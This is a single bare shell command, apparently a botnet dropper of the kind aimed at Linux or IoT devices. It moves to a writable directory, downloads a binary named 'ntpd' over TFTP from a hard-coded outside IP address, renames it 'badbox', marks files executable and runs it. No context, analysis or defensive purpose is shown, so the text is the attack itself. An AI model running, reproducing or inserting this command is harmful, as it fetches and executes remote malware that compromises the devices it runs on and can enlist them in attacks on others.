cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 107.170.8.155;cat ntpd >badbox;chmod +x *;./badbox
